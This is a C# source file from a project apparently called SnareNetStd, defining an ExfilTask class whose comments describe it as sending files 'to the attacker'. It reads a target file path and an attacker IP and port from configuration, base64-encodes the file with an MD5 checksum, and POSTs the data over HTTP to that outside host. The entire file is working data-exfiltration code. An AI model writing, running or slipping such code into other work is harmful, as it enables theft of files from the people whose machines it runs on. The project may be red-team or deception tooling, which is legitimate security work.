using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Threading.Tasks;

namespace SnareNetStd
{
    class ExfilTask
    {
        /// <summary>
        /// File Exfiltration class, POSTs the base64 of a file to the attacker and the MD5SUM so that the transfer can be verified.
        /// </summary>
        public ExfilTask()
        {
            // Ensure all the required properties get populated on create
            FullFilePath = Config.Instance.ExfilFile.TargetFilePath;
            ReturnIp = Config.Instance.ExfilFile.IPAddress;
            ReturnPort = Config.Instance.ExfilFile.PortNumber;
        }

        private string FullFilePath { get; set; }
        private string FileName { get { return Path.GetFileName(FullFilePath); } }
        private string FileContentB64 { get { return Convert.ToBase64String(File.ReadAllBytes(FullFilePath)); } }
        private string ReturnIp { get; set; }
        private int ReturnPort { get; set; }
        private string FileCheckSum { get { return CalculateMD5Sum(FullFilePath); } }



        /// <summary>
        /// Exfiltrate the requested file back to the attacker
        /// </summary>
        /// <returns>string of the results</returns>
        public async Task<string> ExfilFile()
        {
            string Result = string.Empty;

            // Double check we have all the required properties set
            if (FullFilePath == null || ReturnIp == null || ReturnPort == null)
            {
                Result = "Exfil object not fully constructed.";
                return Result;
            }

            bool FileExists = File.Exists(FullFilePath);

            if (FileExists)
            {
                Dictionary<string, string> PostData = new Dictionary<string, string>
                {
                    { "fileName", FileName },
                    { "fileContentB64", FileContentB64 },
                    { "fileCheckSum", FileCheckSum}

                };

                HttpClient client = new HttpClient();
                var PostContent = new FormUrlEncodedContent(PostData);
                var response = await client.PostAsync($"http://{ReturnIp}:{ReturnPort}", PostContent);
                var responseString = await response.Content.ReadAsStringAsync();

                Result = responseString;
            }
            else
            {
                Result = $"File not found: {FullFilePath}";
            }

            return Result;

        }

        /// <summary>
        /// Calculate the MD5SUM of the file so it can be sent to the attacker and they can verify the file transfer on their end
        /// </summary>
        /// <param name="filePath">The full path to the file the checksum</param>
        /// <returns>MD5 string of the file, or nothing if it cant</returns>
        protected string CalculateMD5Sum(string filePath)
        {
            if (File.Exists(filePath))
            {

                using (var md5 = MD5.Create())
                {
                    using (var stream = File.OpenRead(filePath))
                    {
                        return BitConverter.ToString(md5.ComputeHash(stream)).Replace("-", string.Empty);
                    }
                }
            }

            return string.Empty;
        }
    }



}
